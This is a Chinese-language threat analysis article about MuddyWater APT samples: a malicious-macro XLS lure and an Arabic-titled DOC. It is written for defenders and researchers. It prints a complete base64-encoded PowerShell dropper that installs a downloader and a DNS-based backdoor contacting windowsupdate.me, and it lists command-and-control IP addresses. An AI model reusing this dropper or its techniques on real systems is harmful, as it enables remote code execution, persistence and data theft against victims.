# 来自中东的污水，近期MuddyWater组织样本分析

阅读量 **191392**

|评论 **1**

|![](https://p0.ssl.qhimg.com/sdm/30_30_100/t01f942715e2a0f1a23.png)

发布时间 : 2020-12-03 10:00:57

 **x**

##### 译文声明

本文是翻译文章

译文仅供参考，具体内容表达以及含义原文为准。

![](https://p4.ssl.qhimg.com/t01f1b1cd978d580041.jpg)

## 概述

MuddyWater又称污水，是疑似来源于伊朗的APT组织，主要针对中东地区。该APT组织比较善于利用powershell等脚本后门内存加载，无文件落地的方式使得MuddyWater的攻击具有一定的免杀性。此外，该组织早期的攻击活动与FIN7组织有关联，但由于其动机完全不同所以属于两个不同的组织，该组织主要以网络间谍活动为主要动机。

## 样本分析

###  MofaVPN.xls

样本hash：7cb4e466936bbb10fc6633c5a37d1e6c

样本名称：MofaVPN.xls

样本类型：xls

原始样本通过仿冒office官方来提醒用户启用恶意宏代码。

![](https://p0.ssl.qhimg.com/t01c4e687d45517ea59.png)

恶意宏代码启用后，文档会显示一个简单表格以迷惑用户：

![](https://p2.ssl.qhimg.com/t01d406eb5d7434962d.png)

宏代码执行后，会在WorkBook_Open方法中调用komisova_tr2和komisova_s2函数执行关键功能

![](https://p1.ssl.qhimg.com/t01ee4e11f36ce28578.png)

在komisova_tr2函数中，程序首先会读取当前工作表第一行25列和26列的内容，并分别赋值给komisova_vb和komisova_ps变量：

![](https://p5.ssl.qhimg.com/t012605ce006a71da76.png)

这两行的内容刚好会被原始诱饵文档的提示信息给挡住：

![](https://p0.ssl.qhimg.com/t01739f974c03795406.png)

接着创建一个shell对象和一个file对象并通过shell对象获取到%Public%路径：

![](https://p0.ssl.qhimg.com/t0123625d7325751da0.png)

路径成功获取之后，程序会将上面获取到的vb和ps变量base64解码之后赋值给cmd变量，将获取到的%public%路径拼接到cmd2变量。然后判断C:\Users\Public\Libraries目录下是否存在komisova.vbs文件和up、dn、tp目录，若不存在则创建。最后程序分别通过wscript执行cmd和cmd2的指令。

![](https://p3.ssl.qhimg.com/t01d95196391838c019.png)

komisova_s2的功能较为简单，主要是用于切换活动工作表。

![](https://p2.ssl.qhimg.com/t01ff1294cb54cbbee6.png)

由于excel的调试界面中有变量显示长度限制，我们在调试的时候不能看到执行的完整命令。

于是可以通过写入文件的方式分别将cmd和cmd2给写到文件中。

![](https://p4.ssl.qhimg.com/t0175245ed21bced1c5.png)

vba中写入文件的方法很简单，可以简单封装一个函数进行写入：

    
    
    Private Sub CreateTxtFile1()
        Dim fso As Object
        Dim myTxt As Object
        Dim MyFName As String
    
        MyFName = ThisWorkbook.path & "/cmd.txt" 
        Set fso = CreateObject("Scripting.FileSystemObject") 
        Set myTxt = fso.CreateTextFile(fileName:=MyFName, OverWrite:=True) 
        myTxt.Write cmd
        myTxt.Close
        Set myTxt = Nothing
        Set fso = Nothing
      End Sub
    

其中cmd2命令比较简单，主要是设置了一个名为GoogleUpdatesTaskReport的计划任务，该计划任务每两分钟执行一次，用于启动komisova.vbs文件

![](https://p0.ssl.qhimg.com/t012dc726ee248d5e5a.png)

cmd变量解码之后一段powershell Dropper，用于释放后续的vbs和ps1文件

    
    
      powershell "&{$f=[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('SE9NRT0iJXB1YmxpYyVcTGlicmFyaWVzXCINClNFUlZFUj0iaHR0cDovL3dpbmRvd3N1cGRhdGUubWUvdXBkYXRlLWluZGV4LmFzcHg/cmVxPV9fXCINCkR3bj0icG93ZXJzaGVsbCAiIiZ7JHdjPShuZXctb2JqZWN0IFN5c3RlbS5OZXQuV2ViQ2xpZW50KTskd2MuVXNlRGVmYXVsdENyZWRlbnRpYWxzPSR0cnVlOyR3Yy5IZWFkZXJzLmFkZCgnQWNjZXB0JywnKi8qJyk7JHdjLkhlYWRlcnMuYWRkKCdVc2VyLUFnZW50JywnTWljcm9zb2Z0IEJJVFMvNy43Jyk7d2hpbGUoMSl7dHJ5eyRyPUdldC1SYW5kb207JHdjLkRvd25sb2FkRmlsZSgnIiZTRVJWRVImIi1fJm09ZCcsJyImSE9NRSYiZG5cJyskcisnLi1fJyk7U2V0LUNvbnRlbnQgLVBhdGggKCciJkhPTUUmImRuXCcrJHIrJy4tXycpIC1WYWx1ZSAoW1N5c3RlbS5Db252ZXJ0XTo6RnJvbUJhc2U2NFN0cmluZygoR2V0LUNvbnRlbnQgLVBhdGggKCciJkhPTUUmImRuXCcrJHIrJy4tXycpKSkpIC1FbmNvZGluZyBCeXRlOyRjZD0kd2MuUmVzcG9uc2VIZWFkZXJzWydDb250ZW50LURpc3Bvc2l0aW9uJ107UmVuYW1lLUl0ZW0gLXBhdGggKCciJkhPTUUmImRuXCcrJHIrJy4tXycpIC1uZXduYW1lICgkY2QuU3Vic3RyaW5nKCRjZC5JbmRleE9mKCdmaWxlbmFtZT0nKSs5KSl9Y2F0Y2h7YnJlYWt9fX0iIiINCkNyZWF0ZU9iamVjdCgiV1NjcmlwdC5TaGVsbCIpLlJ1biBSZXBsYWNlKER3biwiLV8iLCJkd24iKSwwDQpEb3dubG9hZEV4ZWN1dGU9InBvd2Vyc2hlbGwgIiImeyR3Yz0obmV3LW9iamVjdCBTeXN0ZW0uTmV0LldlYkNsaWVudCk7JHdjLlVzZURlZmF1bHRDcmVkZW50aWFscz0kdHJ1ZTskd2MuSGVhZGVycy5hZGQoJ0FjY2VwdCcsJyovKicpOyR3Yy5IZWFkZXJzLmFkZCgnVXNlci1BZ2VudCcsJ01pY3Jvc29mdCBCSVRTLzcuNycpOyRyPUdldC1SYW5kb207JHdjLkRvd25sb2FkRmlsZSgnaHR0cDovL3dpbmRvd3N1cGRhdGUubWUvdXBkYXRlLWluZGV4LmFzcHg/cmVxPV9fXC1fJm09ZCcsJ2M6XHVzZXJzXHB1YmxpY1xsaWJyYXJpZXNcZG5cJyskcisnLi1fJyk7U2V0LUNvbnRlbnQgLVBhdGggKCciJkhPTUUmImRuXCcrJHIrJy4tXycpIC1WYWx1ZSAoW1N5c3RlbS5Db252ZXJ0XTo6RnJvbUJhc2U2NFN0cmluZygoR2V0LUNvbnRlbnQgLVBhdGggKCciJkhPTUUmImRuXCcrJHIrJy4tXycpKSkpIC1FbmNvZGluZyBCeXRlO0ludm9rZS1FeHByZXNzaW9uICgnIiZIT01FJiJkblwnKyRyKycuLV8gPiImSE9NRSYidXBcJyskcisnLV8nKTskY2Q9JHdjLlJlc3BvbnNlSGVhZGVyc1snQ29udGVudC1EaXNwb3NpdGlvbiddO1JlbmFtZS1JdGVtIC1wYXRoICgnIiZIT01FJiJ1cFwnKyRyKyctXycpIC1uZXduYW1lICgkY2QuU3Vic3RyaW5nKCgkY2QuSW5kZXhPZignZmlsZW5hbWU9JykrOSksKCRjZC5MZW5ndGgtMjUpKSsnLmJhdC50eHQnKTtHZXQtQ2hpbGRJdGVtICImSE9NRSYidXBcIHwgRm9yRWFjaC1PYmplY3Qge2lmKChHZXQtSXRlbSAoJF8uRnVsbE5hbWUpKS5sZW5ndGggLWd0IDApe1tTeXN0ZW0uQ29udmVydF06OlRvQmFzZTY0U3RyaW5nKChbU3lzdGVtLklPLkZpbGVdOjpSZWFkQWxsQnl0ZXMoJF8uRnVsbE5hbWUpKSkgfCBPdXQtRmlsZSAkXy5GdWxsTmFtZTskd2MuVXBsb2FkRmlsZSgnIiZTRVJWRVImInVwbCZtPXUnLCRfLkZ1bGxOYW1lKTt3YWl0Zm9yIGhhaGEgL1QgM307UmVtb3ZlLUl0ZW0gJF8uRnVsbE5hbWV9O1JlbW92ZS1JdGVtICgnIiZIT01FJiJkblwnKyRyKycuLV8nKX0iIiINCkNyZWF0ZU9iamVjdCgiV1NjcmlwdC5TaGVsbCIpLlJ1biBSZXBsYWNlKERvd25sb2FkRXhlY3V0ZSwiLV8iLCJiYXQiKSwwDQprb21jPSJwb3dlcnNoZWxsIC1leGVjIEJ5cGFzcyAtRmlsZSAiJkhPTUUmImtvbWlzb3ZhLnBzMSINCkNyZWF0ZU9iamVjdCgiV1NjcmlwdC5TaGVsbCIpLlJ1biBrb21jLDANCg==')); Set-Content 'C:\Users\Public\Libraries\komisova.vbs' $f;$f=[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('JGdsb2JhbDpteWhvc3QgPSAnLndpbmRvd3N1cGRhdGUubWUnIA0KICRnbG9iYWw6ZmlsZW5hbWUgPSAnJyANCiAkZ2xvYmFsOm15ZmxhZyA9IDAgDQogJGdsb2JhbDpteWlkID0gJyMjIycgDQogJGdsb2JhbDpteWhvbWUgPSAiJGVudjpQdWJsaWNcTGlicmFyaWVzXCIgDQogZnVuY3Rpb24gY29udmVydFRvLUJhc2UzNiAoJGRlY051bT0iIikgDQogeyANCiAgICAkZGVjTnVtICU9IDQ2NjU2IA0KICAgICRhbHBoYWJldCA9ICIwMTIzNDU2Nzg5QUJDREVGR0hJSktMTU5PUFFSU1RVVldYWVoiIA0KICAgIGRvIA0KICAgIHsgDQogICAgICAgICRyZW1haW5kZXIgPSAoJGRlY051bSAlIDM2KSANCiAgICAgICAgJGNoYXIgPSAkYWxwaGFiZXQuc3Vic3RyaW5nKCRyZW1haW5kZXIsMSkgDQogICAgICAgICRiYXNlMzZOdW0gPSAiJGNoYXIkYmFzZTM2TnVtIiANCiAgICAgICAgJGRlY051bSA9ICgkZGVjTnVtIC0gJHJlbWFpbmRlcikgLyAzNiANCiAgICB9IA0KICAgIHdoaWxlICgkZGVjTnVtIC1ndCAwKSANCiAgICAkYmFzZTM2TnVtLlBhZExlZnQoMywnMCcpIA0KCX0gDQoJIA0KCSANCglmdW5jdGlvbiBHZXRTdWIoJG15ZmxhZzMsICRjbWRpZD0nMDAnLCAkcGFydGlkPScwMDAnKSANCiB7IA0KICAgIGlmKCRteWZsYWczIC1lcSAwKSANCiAgICB7IA0KICAgICgnd3cwMDAwMDAnKyhjb252ZXJ0VG8tQmFzZTM2KEdldC1SYW5kb20gLU1heGltdW0gNDY2NTUpKSkgDQogICAgfSANCiAgICBlbHNlaWYoJG15ZmxhZzMgLWVxIDEpIA0KICAgIHsgDQogICAgICAgICgnd3cnKyRnbG9iYWw6bXlpZCsnMDAwMDAnKyhjb252ZXJ0VG8tQmFzZTM2KEdldC1SYW5kb20gLU1heGltdW0gNDY2NTUpKSkgDQogICAgfSANCiAgICBlbHNlaWYoJG15ZmxhZzMgLWVxIDIpIA0KICAgIHsgDQogICAgICAgICgnd3cnKyRnbG9iYWw6bXlpZCskY21kaWQrJHBhcnRpZCsoY29udmVydFRvLUJhc2UzNihHZXQtUmFuZG9tIC1NYXhpbXVtIDQ2NjU1KSkpIA0KICAgIH0gDQp9IA0KIGZ1bmN0aW9uIFN0cjJIZXgoJG15c3RyKSANCiB7IA0KICAgIFtTeXN0ZW0uQml0Q29udmVydGVyXTo6VG9TdHJpbmcoW1N5c3RlbS5UZXh0LkVuY29kaW5nXTo6RGVmYXVsdC5HZXRCeXRlcygkbXlzdHIpKS5SZXBsYWNlKCItIiwgIiIpIA0KfSANCiBmdW5jdGlvbiBBbGl2ZSANCiB7IA0KCWlmKCRnbG9iYWw6bXlpZCAtZXEgJyMnKycjIycpIA0KCXsgDQoJCXJldHVybiAwIA0KCX0gDQogICAgU2VuZFJlY2VpdmVETlMgKChHZXRTdWIgMSkrJzMwJykgDQogICAgJHN1YiA9ICgoR2V0U3ViIDEpKycyMzJBJykgKyAoU3RyMkhleCAkZ2xvYmFsOmZpbGVuYW1lKSANCiAgICAkaSA9IDEgDQogICAgJHJldCA9IDAgDQogICAgd2hpbGUoJGdsb2JhbDpteWZsYWcgLWVxIDEpIA0KICAgIHsgDQogICAgICAgICRyZXQgPSAxIA0KICAgICAgICAkc3ViMiA9ICRzdWIgKyAoU3RyMkhleCAkaSkgDQogICAgICAgIFNlbmRSZWNlaXZlRE5TICRzdWIyIA0KICAgICAgICAkaSsrIA0KICAgIH0gDQogICAgaWYoJHJldCAtZXEgMSkgDQogICAgeyANCiAgICAgICAgRml4QmF0RmlsZSAoJGdsb2JhbDpteWhvbWUrJ3RwXFwnKyRnbG9iYWw6ZmlsZW5hbWUrIi5iYXQiKSANCiAgICB9IA0KICAgICRyZXQgDQp9IA0KIA0KIGZ1bmN0aW9uIFNlbmRSZWNlaXZlRE5TICgkZCkgDQp7IA0KCSRjbnQgPSAwIA0KCXdoaWxlICgkY250IC1sdCAyMCkgDQoJeyANCgkJdHJ5IA0KCQl7IA0KCQkJJG15ZGF0YSA9IChbU3lzdGVtLk5ldC5ETlNdOjpHZXRIb3N0QnlOYW1lKCRkKyRnbG9iYWw6bXlob3N0KS5BZGRyZXNzTGlzdFswXSkgDQoJCQkkbXlkYXRhID0gKCRteWRhdGEgfCBGb3JFYWNoLU9iamVjdCB7JF8uSVBBZGRyZXNzVG9TdHJpbmd9KSANCgkJCSRjbnQgPSAyNSANCgkJfSANCgkJY2F0Y2ggDQoJCXsgDQoJCQlTdGFydC1TbGVlcCAtbSA1MDAgDQoJCQkkY250KysgDQoJCX0gDQoJfSANCiAgICBpZigtbm90KCRjbnQgLWVxIDI1KSkgDQogICAgeyANCiAgICAgICAgKCcjJysnIyMnKSANCiAgICB9IA0KICAgIGVsc2VpZigkZ2xvYmFsOm15ZmxhZyAtZXEgMCAtYW5kICRteWRhdGEuU3RhcnRzV2l0aCgnMzMuMzMuJykpIA0KICAgIHsgDQogICAgICAgICR0bXAgPSAkbXlkYXRhLlN1YlN0cmluZyg2KS5TcGxpdCgnLicpIA0KICAgICAgICAkZ2xvYmFsOmZpbGVuYW1lID0gKFtjaGFyXSBbaW50XSAkdG1wWzBdKSArIChbY2hhcl0gW2ludF0gJHRtcFsxXSkgDQogICAgICAgICRnbG9iYWw6bXlmbGFnID0gMSANCiAgICB9IA0KICAgIGVsc2VpZiAoJG15ZGF0YS5FcXVhbHMoJzM1LjM1LjM1LjM1JykpIA0KICAgIHsgDQogICAgICAgICRnbG9iYWw6bXlmbGFnID0gMCANCiAgICB9IA0KICAgIGVsc2VpZiAoJGdsb2JhbDpteWZsYWcgLWVxIDEpIA0KICAgIHsgDQogICAgICAgICR0bXAgPSAkbXlkYXRhLlNwbGl0KCcuJykgDQogICAgICAgIFtTeXN0ZW0uSU8uRmlsZV06OkFwcGVuZEFsbFRleHQoJGdsb2JhbDpteWhvbWUrJ3RwXCcrJGdsb2JhbDpmaWxlbmFtZSsiLmJhdCIsICgoW2NoYXJdIFtpbnRdICR0bXBbMF0pICsgKFtjaGFyXSBbaW50XSAkdG1wWzFdKSArIChbY2hhcl0gW2ludF0gJHRtcFsyXSkgKyAoW2NoYXJdIFtpbnRdICR0bXBbM10pKSkgDQogICAgfSANCiAgICBlbHNlaWYoJGdsb2JhbDpteWlkIC1lcSAnIycrJyMjJykgDQogICAgeyANCiAgICAgICAgKFtjaGFyXSBbaW50XSAkbXlkYXRhLlNwbGl0KCcuJylbMF0pIA0KICAgIH0gDQogfSANCiBmdW5jdGlvbiBGaXhCYXRGaWxlICgkYmF0cGF0aCkgDQogeyANCiAgIChHZXQtQ29udGVudCAkYmF0cGF0aCkuU3Vic3RyaW5nKDEwKSB8IFNldC1Db250ZW50ICRiYXRwYXRoIA0KfSANCiBmdW5jdGlvbiBTZW5kRmlsZSgkbXlGaWxlUGF0aCkgDQogeyANCiAgICAkbXlGaWxlTmFtZSA9IFtTeXN0ZW0uSU8uUGF0aF06OkdldEZpbGVOYW1lV2l0aG91dEV4dGVuc2lvbigkbXlGaWxlUGF0aCkgDQogICAgJG15c3RyID0gW1N5c3RlbS5JTy5GaWxlXTo6UmVhZEFsbFRleHQoJG15RmlsZVBhdGgpIA0KICAgICRpPTAgDQogICAgJG15dGVtcCA9ICcnIA0KICAgICRqPTAgDQogICAgd2hpbGUoJGkgLWxlICRteXN0ci5MZW5ndGgpIA0KICAgIHsgDQogICAgICAgICRteXRlbXAgKz0gJG15c3RyWyRpXSANCiAgICAgICAgaWYoKCgkaSUyNCkgLWVxIDIzKSAtb3IgKCRpIC1lcSAkbXlzdHIuTGVuZ3RoKSkgDQogICAgICAgIHsgDQogICAgICAgICAgICAkbXloZXggPSBTdHIySGV4ICRteXRlbXAgDQogICAgICAgICAgICBTZW5kUmVjZWl2ZUROUyAoKEdldFN1YiAyICRteUZpbGVOYW1lIChjb252ZXJ0VG8tQmFzZTM2ICRqKSkgKyAkbXloZXgpIA0KICAgICAgICAgICAgJGorKyANCiAgICAgICAgICAgICRteXRlbXAgPSAnJyANCiAgICAgICAgfSANCiAgICAgICAgJGkrKyANCiAgICB9IA0KIH0gDQogDQogZnVuY3Rpb24gR2V0SUQgDQogeyANCiAgICAkZ2xvYmFsOm15aWQgPSBTZW5kUmVjZWl2ZUROUyAoKEdldFN1YiAwKSsnMzAnKSANCiB9IA0KIA0KIGZ1bmN0aW9uIENoYW5nZVRoaXNGaWxlICgkYm90aWQpIA0KIHsgDQoJKEdldC1Db250ZW50ICIkZW52OlB1YmxpY1xMaWJyYXJpZXNca29taXNvdmEucHMxIikgLXJlcGxhY2UgKCcjJysnIyMnKSwkYm90aWQgfCBTZXQtQ29udGVudCAiJGVudjpQdWJsaWNcTGlicmFyaWVzXGtvbWlzb3ZhLnBzMSIgDQogfSANCiANCmZ1bmN0aW9uIEluaXQgDQogeyANCiAgICBpZigkZ2xvYmFsOm15aWQgLWVxICgnIycrJyMjJykpIA0KICAgIHsgDQoJCW1kIC1Gb3JjZSAoJGdsb2JhbDpteWhvbWUrJ3RwXCcpIA0KCQlHZXRJRCANCgkJQ2hhbmdlVGhpc0ZpbGUgJGdsb2JhbDpteWlkIA0KICAgIH0gDQogfSANCiBmdW5jdGlvbiBtYWluIA0KIHsgDQogICAgSW5pdCANCiAgICBpZihBbGl2ZSAtZXEgMSkgDQogICAgeyANCiAgICAgICAgSW52b2tlLUV4cHJlc3Npb24gKCRnbG9iYWw6bXlob21lKyd0cFwnKyRnbG9iYWw6ZmlsZW5hbWUrJy5iYXQgPiAnKyRnbG9iYWw6bXlob21lKyd0cFwnKyRnbG9iYWw6ZmlsZW5hbWUrJy50eHQnKSANCiAgICAgICAgU2VuZEZpbGUgKCRnbG9iYWw6bXlob21lKyd0cFwnKyRnbG9iYWw6ZmlsZW5hbWUrJy50eHQnKSANCiAgICAgICAgUmVtb3ZlLUl0ZW0gKCRnbG9iYWw6bXlob21lKyd0cFwnKyRnbG9iYWw6ZmlsZW5hbWUrJy5iYXQnKSANCiAgICAgICAgUmVtb3ZlLUl0ZW0gKCRnbG9iYWw6bXlob21lKyd0cFwnKyRnbG9iYWw6ZmlsZW5hbWUrJy50eHQnKSANCiAgICB9IA0KIH0gDQogbWFpbiANCg==')); Set-Content 'C:\Users\Public\Libraries\komisova.ps1' $f;(Get-Content $env:Public\Libraries\komisova.vbs) -replace '__',(Get-Random) | Set-Content $env:Public\Libraries\komisova.vbs}"
    

该Dropper一共由五部分组成。

第一部分是解码了一段base64编码的数据并赋值给了$f变量

![](https://p3.ssl.qhimg.com/t01609fff5f9245982c.png)

第二部分是将解码之后的$f变量写入到komisova.vbs中：

![](https://p0.ssl.qhimg.com/t01ec9b88e000926f98.png)

第三部分，再次解密一段base64数据放入到$f变量：

![](https://p0.ssl.qhimg.com/t01da61398eb7a82b7d.png)

第四部分，将第二次解码的代码写入到komisova.ps1中：

![](https://p4.ssl.qhimg.com/t018bdae80117f7c927.png)

第五部分，将vbs之中的双下划线替换为一个随机数：

![](https://p3.ssl.qhimg.com/t01785b6a766ef569a4.png)

**komisova.vbs**

释放的komisova.vbs是一个利用powershell的downloader。

![](https://p4.ssl.qhimg.com/t01938d0bb95253795b.png)

该vbs执行之后，首先会尝试从  
hxxp://windowsupdate.me/update-index.aspx?req=1940721589\  
C2下载文件到本地执行，接着调用powershell执行刚才释放的komisova.ps1文件。

vbs中内嵌了两段powershell代码，第一段powershell代码用于下载文件并将其保存到先前创建的dn目录中

![](https://p5.ssl.qhimg.com/t017318ec944be710a2.png)

第二段powershell代码用于下载bat文件保存到dn目录中并执行后自删除

![](https://p0.ssl.qhimg.com/t01bd1ca837aa716d1e.png)

###  komisova.ps1

经过分析，该ps1文件是一个简单后门。

程序首先预定义了了一些变量，包括C2域名以及文件存放路径：

![](https://p1.ssl.qhimg.com/t01a442fbe152b01ebd.png)

在入口调用的main函数中，程序首先会调用Init函数进行初始化。

初始化时首先会判断$global:myid是否为 ###
，如果是，则说明是该后门第一次启动或表明myid变量没有成功赋值，在这种情况下，程序会调用GetId函数尝试通过SendReceiveDNS对C2发起请求以获取dns服务器，使用SendReceiveDNS函数的返回值给myid变量赋值。然后尝试将新的myid替换掉该ps文件中的’###’符号。

![](https://p5.ssl.qhimg.com/t012a1437dec4e8e0d9.png)

初始化函数完成之后，程序会通过Alive函数判断样本是否在线，判断方式是尝试从C2下载bat文件到本地，下载成功返回1.

![](https://p4.ssl.qhimg.com/t015d4204f994cca525.png)

若bat文件成功下载，程序则会启动该bat文件并且将结果管道输出到与bat文件听命的txt文件中，并且通过SendFile将该文件发送到C2，然后删除bat文件和txt文件。

![](https://p1.ssl.qhimg.com/t016239d266478ec86c.png)

虽然由于C2已失效的无法获取到这里的bat文件，但是根据后续代码来看，这里的bat应该是一个简单的信息收集脚本。

###  小结

1.原始样本为xls文档，文档伪装office官方提示用户启用宏。

2.宏代码执行后会从活动工作表中读取cells内容。

3.根据读取出来的内容解码出一段vbs代码和一段用于创建计划任务的shell指令。

4.vbs代码会释放一个vbs文件和一个powershell文件。

5.释放的vbs文件是一个downloader，并且带有load释放的ps文件的功能。

6.释放的powershell文件是一个后门，用于收集用户计算机信息。

###  ورشة عمل تدریبیة.doc

样本hash：a2707bfb35c9fed11d81949873d3a00a

样本名称：ورشة عمل تدریبیة.doc

样本类型：doc

原始样本带恶意宏代码并通过提示用户文档已被保护，诱导用户启用宏。

![](https://p1.ssl.qhimg.com/t012ccae430e0ec6290.png)

宏代码启用后，会自动执行Document_Open()方法，调用main和DialogUserInfo

![](https://p2.ssl.qhimg.com/t01e3d0fdf3c3bdff27.png)

在main函数中，程序首先通过generateMailFormat拼接出用户的启动路径

![](https://p3.ssl.qhimg.com/t0124c53803195ecc69.png)

接着程序拼接并解密一段预定义的字符串

![](https://p2.ssl.qhimg.com/t015d193d8550cdd198.png)

解密算法很简单，就是将最开始预定义的数组进行循环替换：

![](https://p0.ssl.qhimg.com/t0131f530bf5aa7c1c3.png)

替换完成之后，程序继续对该字符串进行了三次替换操作，最后通过CreateTextFile将其保存到了之前拼接出来的启动路径中，文件名为EGOJT7.vbs

![](https://p5.ssl.qhimg.com/t0114243ccca85684bb.png)

![](https://p1.ssl.qhimg.com/t016aae18c3193a0a01.png)

vbs文件头部预定义了一些变量，顺便调用了几个函数进行初始化：

![](https://p1.ssl.qhimg.com/t0141c144b7f6086fb5.png)

首先是func_MKO函数，func_MKO中主要是调用了func_VYMMG，然后将函数参数和函数的返回结果拼接返回。

此外，如果COCAP_0 = 126，则还会调用func_ZQEKP，在本样本中，COCAP_0的值为0 ，不会走到该分支。

![](https://p1.ssl.qhimg.com/t01868b32156a2064cb.png)

func_ZQEKP包含了一些基本的信息收集和远控功能

![](https://p1.ssl.qhimg.com/t01dc77c725246ca10e.png)

最后的func_MFVKE函数用于收集本地主机的基本信息：

![](https://p2.ssl.qhimg.com/t01753c62fd4058629f.png)

func_VYMMG函数功能是通过cmd执行参数传递进来的指令并输出保存到out.txt中

![](https://p4.ssl.qhimg.com/t01aa273ec423442ab7.png)

func_MKO之后是调用了解密函数func_HWTU

![](https://p4.ssl.qhimg.com/t010ca1b45719b8602b.png)

将第一部分的zin.znr.zjq.ziu:uuv,zmr.zzn.nv.ry:uuv,zmr.zuz.yq.mz:uuv,mn.yvq.yzy.mz:uuv解密出来会得到一个ip列表：

“107.175.196.104:443,185.117.73.52:443,185.141.26.81:443,87.236.212.81:443”

然后将其以逗号分隔传递到新的数组中：

![](https://p3.ssl.qhimg.com/t012a3e252b8b8f7bcd.png)

第二个串解密出来得到一个请求协议头：  
“Mozilla/4.0 (compatible; ms-office; MSOffice 16)”

这一系列初始化完成之后，程序就会接着调用func_KFYZG()

![](https://p5.ssl.qhimg.com/t011d1ad42cb883de7e.png)

在该函数中，程序首先是通过func_VYMMG打开资源管理器

![](https://p3.ssl.qhimg.com/t019a9f82a7dbd355be.png)

然后调用func_QNBPR进行随机数睡眠

![](https://p3.ssl.qhimg.com/t011faa279cf4f87bb7.png)

随眠之后根据之前解码的ip地址和端口和通过whoami获取到的信息拼接起来形成请求地址：

![](https://p5.ssl.qhimg.com/t01974a023e4e9bf50f.png)

样本首先会判断func_XBW函数返回值是否为空，当func_XBW返回非空，则说明程序与服务器已经建立了正常连接，那么程序则会调用func_YUB对服务器发起请求。

![](https://p5.ssl.qhimg.com/t014e787600d8e65567.png)

第二次请求的时候，多了status参数，这里已经设置为1，猜测是表明成功上线。此外，样本还会将第一次网络请求返回的JVLOQ_6作为命令参数传递到func_VYMMG函数中并将运行结果作为参数返回到服务器。

本文翻译自 [原文链接]()。如若转载请注明出处。

商务合作，文章发布请联系 anquanke@360.cn

本文由 **jux1a** 原创发布

转载，请参考[转载声明](https://www.anquanke.com/note/repost)，注明出处：
[https://www.anquanke.com/post/id/224410](/post/id/224410)

安全客 - 有思想的安全新媒体

本文转载自: []()

如若转载,请注明出处： []()

安全客 - 有思想的安全新媒体

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

  * [APT](/tag/APT)
  * [MuddyWater](/tag/MuddyWater)

 **+1** __10赞

 __收藏

![](https://p4.ssl.qhimg.com/t01c900f6a705a10464.png) jux1a

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

